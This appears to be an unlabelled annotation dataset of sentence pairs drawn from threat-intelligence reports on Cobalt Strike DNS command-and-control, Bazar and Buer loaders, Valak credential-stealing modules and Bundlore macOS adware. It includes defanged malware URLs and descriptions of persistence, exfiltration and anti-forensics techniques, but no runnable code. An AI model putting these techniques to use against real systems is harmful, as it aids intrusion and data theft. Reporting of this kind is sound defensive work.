        "S1": "We observed the use of Cobalt Strike\u2019s C2 protocol encapsulated in DNS by the adversary in 2017 and 2018.",
        "S2": "An interesting observation is they made use of a cracked/patched trial version of Cobalt Strike.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S175<=>S182",
        "S1": "An interesting observation is they made use of a cracked/patched trial version of Cobalt Strike.",
        "S2": "As the adversary used Cobalt Strike with DNS as command control protocol, we were able to reconstruct more than two years of adversary activity.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S176<=>S182",
        "S1": "This is important to note because the functionalities of Cobalt Strike\u2019s trial version are limited.",
        "S2": "As the adversary used Cobalt Strike with DNS as command control protocol, we were able to reconstruct more than two years of adversary activity.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S177<=>S182",
        "S1": "More importantly: the trial version doesn\u2019t support encryption of command and control traffic in cases where the protocol itself isn\u2019t encrypted, such as DNS.",
        "S2": "As the adversary used Cobalt Strike with DNS as command control protocol, we were able to reconstruct more than two years of adversary activity.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S178<=>S181",
        "S1": "In one intrusion we investigated, the victim had years of logging available of outgoing DNS-requests.",
        "S2": "We developed a Python script that decoded and combined most of the logged C2 communication into a human readable format.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S178<=>S180",
        "S1": "In one intrusion we investigated, the victim had years of logging available of outgoing DNS-requests.",
        "S2": "This means that only the DNS C2 leaving the victim\u2019s network was logged.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S182<=>S184",
        "S1": "As the adversary used Cobalt Strike with DNS as command control protocol, we were able to reconstruct more than two years of adversary activity.",
        "S2": "The activity took place six days a week, rarely on Sundays.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S182<=>S197",
        "S1": "As the adversary used Cobalt Strike with DNS as command control protocol, we were able to reconstruct more than two years of adversary activity.",
        "S2": "The following cloud storage web services are supported by the malware:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S183<=>S186",
        "S1": "With all this activity data, it was possible for us to create some insight into the \u2018office\u2019-hours of this adversary.",
        "S2": "We observed some periods where we expected activity of the adversary, but almost none was observed.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S186<=>S188",
        "S1": "We observed some periods where we expected activity of the adversary, but almost none was observed.",
        "S2": "The adversary also changed their domains for command control around the same time they switched C2 protocols.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S186<=>S205",
        "S1": "We observed some periods where we expected activity of the adversary, but almost none was observed.",
        "S2": "We have observed the exfiltration tool in the following locations:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S189<=>S192",
        "S1": "They used a subdomain under a regular parent domain with a .com TLD in 2017 and 2018, but they started using sub-domains under the parent domain appspot.com and azureedge.net in 2019.",
        "S2": "The adversary uses the command and control channel to exfiltrate small amounts of data.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S192<=>S194",
        "S1": "The adversary uses the command and control channel to exfiltrate small amounts of data.",
        "S2": "For large amounts of data, such as the mailboxes and network shares with intellectual property, they use something else.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S194<=>S209",
        "S1": "For large amounts of data, such as the mailboxes and network shares with intellectual property, they use something else.",
        "S2": "The adversary attempts to clean-up some of the traces from their intrusions.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S201<=>S205",
        "S1": "The actor specifies the following arguments when running the exfiltration tool:",
        "S2": "We have observed the exfiltration tool in the following locations:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S205<=>S210",
        "S1": "We have observed the exfiltration tool in the following locations:",
        "S2": "While we don\u2019t know what was deleted and we were unable to recover, we did see some of their anti-forensics activity:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S210<=>S215",
        "S1": "While we don\u2019t know what was deleted and we were unable to recover, we did see some of their anti-forensics activity:",
        "S2": "For indicator removal on host: Timestomp the adversary uses a Windows version of the Linux touch command.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S211<=>S215",
        "S1": "- Windows event logs clearing,",
        "S2": "For indicator removal on host: Timestomp the adversary uses a Windows version of the Linux touch command.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S215<=>S217",
        "S1": "For indicator removal on host: Timestomp the adversary uses a Windows version of the Linux touch command.",
        "S2": "This makes sure the used tools by the adversary blend in with the other files in the directory when shown in a timeline.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md::S0<=>S5",
        "S1": "In this email campaign, instead of relying on attachments, the attackers included links to what appeared to be a legitimate Google Docs document, which itself contained links to malicious files hosted on Google Drive or, in some cases, hosted elsewhere.",
        "S2": "Although, the use of target names with actuating themes is not new to this group, there has been a significant uptick in the number of emails received and this campaign has been persistently active for the past few weeks.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md::S1<=>S3",
        "S1": "In some previous phishing email campaigns, attackers leveraged SendGrid to distribute the initial emails to hide the Google Drive links in the documents behind a SendGrid URL as a way to bypass traditional defences.",
        "S2": "The link in both emails is a Google Docs link claiming to host a PDF file with a list of employees that have been terminated, as shown in Figure 3.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md::S2<=>S29",
        "S1": "Samples of emails that we have seen are shown in Figure 1 and Figure 2.",
        "S2": "We are not going to go into technical details because detailed analysis of this has already published.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md::S4<=>S6",
        "S1": "The link in the Google Doc redirects to the URL unitedyfl[.]com/print_preview.exe to download the malware payload.",
        "S2": "In most cases, the payload that is downloaded is the Bazar malware but, in some cases, it is the Buer loader.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md::S5<=>S13",
        "S1": "Although, the use of target names with actuating themes is not new to this group, there has been a significant uptick in the number of emails received and this campaign has been persistently active for the past few weeks.",
        "S2": "The Bazar backdoor is a new stealthy malware, part of the TrickBot group\u2019s toolkit arsenal and leveraged for high-value targets.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md::S5<=>S12",
        "S1": "Although, the use of target names with actuating themes is not new to this group, there has been a significant uptick in the number of emails received and this campaign has been persistently active for the past few weeks.",
        "S2": "In this campaign, no process self-injection is used to load the payload.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md::S6<=>S18",
        "S1": "In most cases, the payload that is downloaded is the Bazar malware but, in some cases, it is the Buer loader.",
        "S2": "The Bazar loader downloads the Bazar backdoor from the C&C using the following URI format: {C&C}/api/v\\d{3}",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md::S6<=>S20",
        "S1": "In most cases, the payload that is downloaded is the Bazar malware but, in some cases, it is the Buer loader.",
        "S2": "The downloaded malware was successfully captured by the Zscaler Cloud Sandbox: Figure 6: The Zscaler Cloud Sandbox report.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md::S6<=>S13",
        "S1": "In most cases, the payload that is downloaded is the Bazar malware but, in some cases, it is the Buer loader.",
        "S2": "The Bazar backdoor is a new stealthy malware, part of the TrickBot group\u2019s toolkit arsenal and leveraged for high-value targets.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md::S12<=>S16",
        "S1": "In this campaign, no process self-injection is used to load the payload.",
        "S2": "The samples used in this campaign heavily rely on control flow obfuscation.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md::S14<=>S21",
        "S1": "The Bazar loader is used to download and execute the Bazar backdoor on the target system.",
        "S2": "The C&C TLS communications of the Bazar backdoor have been using certificates created in the same manner that TrickBot certificates have been created.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md::S15<=>S17",
        "S1": "The goal of this backdoor is to execute binaries, scripts, modules, kill processes, and then remove itself from the compromised machine.",
        "S2": "The detailed analysis report about this backdoor can be found here.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md::S18<=>S21",
        "S1": "The Bazar loader downloads the Bazar backdoor from the C&C using the following URI format: {C&C}/api/v\\d{3}",
        "S2": "The C&C TLS communications of the Bazar backdoor have been using certificates created in the same manner that TrickBot certificates have been created.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md::S20<=>S30",
        "S1": "The downloaded malware was successfully captured by the Zscaler Cloud Sandbox: Figure 6: The Zscaler Cloud Sandbox report.",
        "S2": "The Buer loader was captured by the Zscaler Cloud Sandbox.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md::S21<=>S23",
        "S1": "The C&C TLS communications of the Bazar backdoor have been using certificates created in the same manner that TrickBot certificates have been created.",
        "S2": "Researchers also observed that the backdoor downloads and executes the Cobalt Strike pentesting and post-exploitation toolkit on the victim's machine within some period of time after the infection.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-787.md::S28<=>S30",
        "S1": "It has most of the important strings encrypted and APIs are loaded by hash, just like most of the sophisticated malware these days.",
        "S2": "The Buer loader was captured by the Zscaler Cloud Sandbox.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S0<=>S2",
        "S1": "In these campaigns, the most common infection vector is via Microsoft Word documents embedded with malicious macro code.",
        "S2": "Malicious macro code is used to download a DLL file with .cab extension named \u201cU.tmp\u201d and saved into the temp folder.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S2<=>S4",
        "S1": "Malicious macro code is used to download a DLL file with .cab extension named \u201cU.tmp\u201d and saved into the temp folder.",
        "S2": "After downloading the DLL, the code launches the malicious DLL using \u201cregsvr32.exe\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S6<=>S10",
        "S1": "This stage of the Valak malware uses a malicious JavaScript file with a random name that changes per execution.",
        "S2": "Valak creates connections to the different C2 servers in the list with two predefined URIs:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S6<=>S16",
        "S1": "This stage of the Valak malware uses a malicious JavaScript file with a random name that changes per execution.",
        "S2": "Both files are decoded by the malware using Base64 and an XOR cipher.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S8<=>S95",
        "S1": "The downloaded JavaScript code, \u201csly4.0\u201d, contains a variable called \u201cPRIMARY_C2\u201d that holds multiple fake and legitimate domains, including Google, Gmail, Avast, and Microsoft.",
        "S2": "The \u201ctarget\u201d variable is used in the core ManagedPlugin function to store strings related to Microsoft Office applications.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S10<=>S20",
        "S1": "Valak creates connections to the different C2 servers in the list with two predefined URIs:",
        "S2": "After downloading the payloads and setting the registry keys and values, Valak sets it\u2019s persistence via a scheduled task.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S11<=>S13",
        "S1": "One URI is used to download an encoded file named \u201cproject.aspx\u201d",
        "S2": "*in version 30, the file was renamed to \u201crpx.aspx\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S13<=>S15",
        "S1": "*in version 30, the file was renamed to \u201crpx.aspx\u201d.",
        "S2": "*in version 30, the file was renamed to \u201cgo.aspx\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S15<=>S24",
        "S1": "*in version 30, the file was renamed to \u201cgo.aspx\u201d.",
        "S2": "In the second stage, it downloads additional modules for reconnaissance activity and to steal sensitive information.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S16<=>S18",
        "S1": "Both files are decoded by the malware using Base64 and an XOR cipher.",
        "S2": "The malware sets information like the C2 server, ID, the downloaded payload, and the decoded project.aspx in a registry key under \u201cHKCU\\Software\\ApplicationContainer\\Appsw64\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S18<=>S20",
        "S1": "The malware sets information like the C2 server, ID, the downloaded payload, and the decoded project.aspx in a registry key under \u201cHKCU\\Software\\ApplicationContainer\\Appsw64\u201d.",
        "S2": "After downloading the payloads and setting the registry keys and values, Valak sets it\u2019s persistence via a scheduled task.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S20<=>S32",
        "S1": "After downloading the payloads and setting the registry keys and values, Valak sets it\u2019s persistence via a scheduled task.",
        "S2": "In the second stage, the configuration file has been altered to contain a unique \u201cClient_ID\u201d and a different file that it will try to download called \u201cbounce.aspx\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S20<=>S38",
        "S1": "After downloading the payloads and setting the registry keys and values, Valak sets it\u2019s persistence via a scheduled task.",
        "S2": "Our analysis reveals that this time, the payload downloaded by Valak was IcedID.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S20<=>S92",
        "S1": "After downloading the payloads and setting the registry keys and values, Valak sets it\u2019s persistence via a scheduled task.",
        "S2": "The module handles its credential management in the class \u201cCredential\u201d, which includes several functions that handle the credential management activity and data types that will hold these credentials.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S22<=>S28",
        "S1": "The script in the ADS (\u201cDefault2.ini\u201d) executes the content of the registry key, \u201cHKCU\\Software\\ApplicationContainer\\Appsw64\\ServerUrl\u201d, which holds the contents of \u201cproject.aspx\u201d, the second stage JavaScript file.",
        "S2": "The script is executed by the scheduled task used to maintain persistence, with its main goal being:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S25<=>S32",
        "S1": "The two payloads (\u201cproject.aspx\u201d and \u201ca.aspx\u201d) and the configuration in the registry keys are used in the second stage to perform malicious activities.",
        "S2": "In the second stage, the configuration file has been altered to contain a unique \u201cClient_ID\u201d and a different file that it will try to download called \u201cbounce.aspx\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S25<=>S71",
        "S1": "The two payloads (\u201cproject.aspx\u201d and \u201ca.aspx\u201d) and the configuration in the registry keys are used in the second stage to perform malicious activities.",
        "S2": "Below is a deep dive of \u201csysteminfo\u201d and \u201cexchgrabber\u201d, which are more advanced and complex than the aforementioned plugin components.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S30<=>S34",
        "S1": "Download and parse additional payloads from the C2.",
        "S2": "These functions are called from the \u201cParseTask\u201d function, and receive the parsed tasks from the C2.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S32<=>S35",
        "S1": "In the second stage, the configuration file has been altered to contain a unique \u201cClient_ID\u201d and a different file that it will try to download called \u201cbounce.aspx\u201d.",
        "S2": "If the malware downloads a payload that starts with the word \u201cODTASK\u201d, it calls \u201cCreateOleExecJob\u201d, which writes the payload as an ADS of the file \u201cC:\\\\Users\\\\Public\\\\PowerManagerSpm.jar\u201d and creates a scheduled task \u201cPerfWatson_%taskname%\u201d to run it.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S37<=>S44",
        "S1": "If the malware receives a content starting with the word \u201cTASK\u201d, it calls \u201cCreateExecJob\u201d, which writes the content as an ADS of the file \u201cC:\\\\Users\\\\Public\\\\PowerManagerSpm.jar\u201d and creates a scheduled task \u201cPowerUtility_%taskname%W\u201d to run it.",
        "S2": "The functionality of the executable \u201cPluginHost.exe\u201d is divided into four classes: Bot, HTTPClient, Program and Utils, which will allow it to perform its main goal of downloading and loading additional components of the malware.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S38<=>S40",
        "S1": "Our analysis reveals that this time, the payload downloaded by Valak was IcedID.",
        "S2": "In previous infections, Valak downloaded different remote administration tools like putty.exe and NetSupport Manager.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S38<=>S61",
        "S1": "Our analysis reveals that this time, the payload downloaded by Valak was IcedID.",
        "S2": "During this analysis, we discovered several different modules with the same internal name, \u201cManagedPlugin.dll\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S40<=>S43",
        "S1": "In previous infections, Valak downloaded different remote administration tools like putty.exe and NetSupport Manager.",
        "S2": "Valak\u2019s Modular Plugin Architecture",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S43<=>S58",
        "S1": "Valak\u2019s Modular Plugin Architecture",
        "S2": "When referring to additional plugins, it is worth noting that in early versions of Valak the plugins were downloaded by the second stage JS via PowerShell.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S44<=>S51",
        "S1": "The functionality of the executable \u201cPluginHost.exe\u201d is divided into four classes: Bot, HTTPClient, Program and Utils, which will allow it to perform its main goal of downloading and loading additional components of the malware.",
        "S2": "The HTTPClient class contains two functions, post and GetPluginBytes.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S44<=>S50",
        "S1": "The functionality of the executable \u201cPluginHost.exe\u201d is divided into four classes: Bot, HTTPClient, Program and Utils, which will allow it to perform its main goal of downloading and loading additional components of the malware.",
        "S2": "Both functions use the Utils class to read registry entries.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S49<=>S52",
        "S1": "GetC2() reads from the registry entry \u201cShimV4\u201d, which holds the C2 domain.",
        "S2": "The GetPluginBytes() function gets the C2 domain using GetC2() and adds an embedded URI.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S51<=>S57",
        "S1": "The HTTPClient class contains two functions, post and GetPluginBytes.",
        "S2": "The Utils class contains several maintenance functions used by the other classes.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S53<=>S56",
        "S1": "The URL is used to download an additional module for the plugin.",
        "S2": "These components will be loaded reflectively to the executable\u2019s memory and expand the plugin capabilities.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S55<=>S96",
        "S1": "This function executes the function GetPluginBytes() to download the module components with type \u201cManagedPlugin\u201d.",
        "S2": "Another interesting argument in the \u201ccredential\u201d function is \u201cCredentialType\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S56<=>S58",
        "S1": "These components will be loaded reflectively to the executable\u2019s memory and expand the plugin capabilities.",
        "S2": "When referring to additional plugins, it is worth noting that in early versions of Valak the plugins were downloaded by the second stage JS via PowerShell.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S59<=>S73",
        "S1": "More recent versions of Valak abandoned the popular yet easily detectable PowerShell downloader approach and transitioned to PluginHost as a means of managing and downloading additional payloads.",
        "S2": "However, unlike \u201cPluginHost\u201d, it contains several reconnaissance functions that focus on gathering information about the user, the machine, and existing AV products.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S60<=>S75",
        "S1": "This transition indicates that the Valak authors are looking for stealthier approaches and ways to improve their evasion techniques.",
        "S2": "This shows that after infecting the machine, Valak chooses to target mainly administrators and domain admins.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S62<=>S69",
        "S1": "These modules are downloaded and loaded by \u201cPluginHost.exe\u201d.",
        "S2": "Among these components, some focus on one single, specific activity to achieve their goal and are relatively less robust than others when it comes to capability and potential impact.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S63<=>S71",
        "S1": "- Systeminfo : responsible for extensive reconnaissance; targets local and domain admins",
        "S2": "Below is a deep dive of \u201csysteminfo\u201d and \u201cexchgrabber\u201d, which are more advanced and complex than the aforementioned plugin components.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S64<=>S71",
        "S1": "- Exchgrabber: aims to steal Microsoft Exchange data and infiltrates the enterprises mail system",
        "S2": "Below is a deep dive of \u201csysteminfo\u201d and \u201cexchgrabber\u201d, which are more advanced and complex than the aforementioned plugin components.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S66<=>S68",
        "S1": "- Procinfo: collects information about the infected machine\u2019s running processes",
        "S2": "- Screencap: captures screenshots from the infected machine",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S66<=>S70",
        "S1": "- Procinfo: collects information about the infected machine\u2019s running processes",
        "S2": "This includes ipgeo, procinfo, netrecon and screencap.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S67<=>S70",
        "S1": "- Netrecon: performs network reconnaissance",
        "S2": "This includes ipgeo, procinfo, netrecon and screencap.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S68<=>S70",
        "S1": "- Screencap: captures screenshots from the infected machine",
        "S2": "This includes ipgeo, procinfo, netrecon and screencap.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S74<=>S77",
        "S1": "The module gathers information about the user and attempts to verify whether this is a local admin or a domain admin.",
        "S2": "The module attempts to find whether the infected machine has any security products installed using the AntivirusSoftware() function.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S75<=>S77",
        "S1": "This shows that after infecting the machine, Valak chooses to target mainly administrators and domain admins.",
        "S2": "The module attempts to find whether the infected machine has any security products installed using the AntivirusSoftware() function.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S77<=>S79",
        "S1": "The module attempts to find whether the infected machine has any security products installed using the AntivirusSoftware() function.",
        "S2": "The module also collects the physical address (MAC) and the IP address of the infected machine.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S79<=>S84",
        "S1": "The module also collects the physical address (MAC) and the IP address of the infected machine.",
        "S2": "In order to exfiltrate data, the plugin uses the function \u201cpost\u201d in the HTTPClient class.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S85<=>S88",
        "S1": "\u201cPost\u201d gives the plugin the ability to upload content and exfiltrate data to the remote C2 whose domain is stored in the registry.",
        "S2": "The core functionality of the \u201cManagedPlugin\u201d module is in the \u201cManagedPlugin\u201d class.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S86<=>S90",
        "S1": "Similar to \u201cPluginHost\u201d, \u201cSystemInfo\u201d uses another function called GetQuery() that builds the URL to send the information to the remote C2.",
        "S2": "Exchgrabber, similar to systeminfo, shares some similarities with PluginHost when it comes to several function names like Bot, HTTPClient, and Utils; however, it has its own differentiated capabilities.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S88<=>S103",
        "S1": "The core functionality of the \u201cManagedPlugin\u201d module is in the \u201cManagedPlugin\u201d class.",
        "S2": "When inspecting the core logic behind the class MainPlugin, it\u2019s clear how each class collaborates with others to extract data from Microsoft Exchange and Outlook.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S92<=>S94",
        "S1": "The module handles its credential management in the class \u201cCredential\u201d, which includes several functions that handle the credential management activity and data types that will hold these credentials.",
        "S2": "It inserts these credentials into the respective module variable.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S93<=>S95",
        "S1": "One of the most interesting functions in this class is \u201cCredential\u201d which receives four arguments: username, password, target, and CredentialType.",
        "S2": "The \u201ctarget\u201d variable is used in the core ManagedPlugin function to store strings related to Microsoft Office applications.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S94<=>S97",
        "S1": "It inserts these credentials into the respective module variable.",
        "S2": "The type of credentials is determined by another part of the enum variable called \u201cCredentialType\u201d, which contains each of the credentials that the module will attempt to extract.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S95<=>S104",
        "S1": "The \u201ctarget\u201d variable is used in the core ManagedPlugin function to store strings related to Microsoft Office applications.",
        "S2": "The module attempts to check if the extracted data is related to Microsoft Office or MS.Outlook.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S97<=>S104",
        "S1": "The type of credentials is determined by another part of the enum variable called \u201cCredentialType\u201d, which contains each of the credentials that the module will attempt to extract.",
        "S2": "The module attempts to check if the extracted data is related to Microsoft Office or MS.Outlook.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S98<=>S103",
        "S1": "The credential types are sensitive information that can be extracted from the enterprise Microsoft Exchange server data, including Domain Password & Domain Certificate.",
        "S2": "When inspecting the core logic behind the class MainPlugin, it\u2019s clear how each class collaborates with others to extract data from Microsoft Exchange and Outlook.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S103<=>S107",
        "S1": "When inspecting the core logic behind the class MainPlugin, it\u2019s clear how each class collaborates with others to extract data from Microsoft Exchange and Outlook.",
        "S2": "The primary purpose of the Exchange Autodiscover service is to establish initial connections to Exchange user mailboxes.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S104<=>S106",
        "S1": "The module attempts to check if the extracted data is related to Microsoft Office or MS.Outlook.",
        "S2": "\u201cAutodiscover.xml\u201d is a dynamically generated file that contains the data Microsoft Outlook needs to access the mailbox entered in the configuration wizard.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-826.md::S109<=>S111",
        "S1": "After collecting the sensitive data, the module compresses it using Base64.",
        "S2": "Then, it sends the sensitive data to the attacker\u2019s C2 with the POST function and an embedded URI.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S0<=>S3",
        "S1": "The mm-install->macos variant of the Bundlore family of macOS adware has been around for many years in many variations and delivery methods.",
        "S2": "The malware also utilizes a form of obfuscation not observed before in this family, hiding compressed data in a resource fork on a downloaded script file.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S1<=>S3",
        "S1": "Recently, a variant with a novel installation method was discovered.",
        "S2": "The malware also utilizes a form of obfuscation not observed before in this family, hiding compressed data in a resource fork on a downloaded script file.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S2<=>S4",
        "S1": "Although most of the installation details were the same or similar to the samples analyzed in the blogs above, these new samples modified the sudoers file on the infected system to remove the password requirement for privilege escalation.",
        "S2": "These samples were observed to be installed via a malicious chrome extension (crx file).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S3<=>S29",
        "S1": "The malware also utilizes a form of obfuscation not observed before in this family, hiding compressed data in a resource fork on a downloaded script file.",
        "S2": "The command in the second line of the script takes the last 254kb of the resource fork on the Install.command file, unzips the contents, then further decompresses the data, copying it to the previously created temporary directory.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S4<=>S10",
        "S1": "These samples were observed to be installed via a malicious chrome extension (crx file).",
        "S2": "The analyzed samples were manually downloaded from a specially crafted URL from the site http://download[.]mycouponsmartmac[.]com.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S5<=>S10",
        "S1": "This extension was pulled from an adware site http://download[.]mycouponsmartmac[.]com and was not publicly uploaded at the time of analysis.",
        "S2": "The analyzed samples were manually downloaded from a specially crafted URL from the site http://download[.]mycouponsmartmac[.]com.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S6<=>S12",
        "S1": "After the MyCouponsmart extension is installed, javascript is injected into the browser that displays pop-up ads and redirects the user to a website requiring the user to download a fake Adobe Flash Player update.",
        "S2": "After the downloaded MyCouponsmart extension is installed, it injects javascript code from chrome-extension://background.js into the browser which contains code to either pop up an advertisement or redirect the webpage.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S6<=>S9",
        "S1": "After the MyCouponsmart extension is installed, javascript is injected into the browser that displays pop-up ads and redirects the user to a website requiring the user to download a fake Adobe Flash Player update.",
        "S2": "Interestingly, this page has a disclaimer included at the bottom informing the user that the installer may suggest installation of additional \u201cfree software offers\u201d and that the Flash Player downloaded from the site is not affiliated with Adobe Flash.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S9<=>S12",
        "S1": "Interestingly, this page has a disclaimer included at the bottom informing the user that the installer may suggest installation of additional \u201cfree software offers\u201d and that the Flash Player downloaded from the site is not affiliated with Adobe Flash.",
        "S2": "After the downloaded MyCouponsmart extension is installed, it injects javascript code from chrome-extension://background.js into the browser which contains code to either pop up an advertisement or redirect the webpage.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S9<=>S15",
        "S1": "Interestingly, this page has a disclaimer included at the bottom informing the user that the installer may suggest installation of additional \u201cfree software offers\u201d and that the Flash Player downloaded from the site is not affiliated with Adobe Flash.",
        "S2": "Immediately after the Flash zip file is downloaded, the browser is redirected to a site offering the download of another Chrome extension named \u201cSearch Manager\u201d",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S13<=>S28",
        "S1": "More details regarding this extension are covered in the Configuration Profiles section below.",
        "S2": "This script creates a temporary directory into which it will copy and execute the mm-install-macos app.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S18<=>S22",
        "S1": "The script extracts compressed data containing a macOS .app in a hidden resource known as a resource fork.",
        "S2": "On macOS, these forks are implemented as an extended attribute (xattr) and can be enumerated or visualized using system tools such as ls and xattr.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S20<=>S22",
        "S1": "Resource forks were originally designed to allow an executable to store multiple resources within the file, yet remain separated from the executable data.",
        "S2": "On macOS, these forks are implemented as an extended attribute (xattr) and can be enumerated or visualized using system tools such as ls and xattr.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S22<=>S28",
        "S1": "On macOS, these forks are implemented as an extended attribute (xattr) and can be enumerated or visualized using system tools such as ls and xattr.",
        "S2": "This script creates a temporary directory into which it will copy and execute the mm-install-macos app.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-885.md::S28<=>S30",
        "S1": "This script creates a temporary directory into which it will copy and execute the mm-install-macos app.",
        "S2": "The decompressed data is a macOS .app, which the script then executes in the background.",
        "relation": ""
    },
    {
